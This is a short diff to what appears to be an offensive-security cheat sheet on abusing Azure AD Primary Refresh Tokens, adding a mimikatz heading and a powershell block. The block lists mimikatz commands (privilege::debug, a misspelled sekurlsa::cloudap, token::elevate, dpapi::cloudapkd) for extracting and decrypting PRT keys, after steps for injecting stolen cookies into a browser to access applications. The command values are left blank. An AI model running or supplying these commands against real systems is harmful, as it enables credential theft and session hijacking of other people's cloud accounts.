@@ -9,10 +9,12 @@ Abusing Azure AD PRT
 3️⃣ Inject your cookies in your browser 
 4️⃣ Access the application
 
-PRT and cookie manipulation
+PRT and cookie manipulation with mimikatz
 
+```powershell
  privilege::debug 
  sukurlsa::cloudap 
  token::elevate 
  dpapi::cloudapkd /keyvalue: /unprotect 
  dpapi::cloudapkd /prt: /derivedkey:
+```
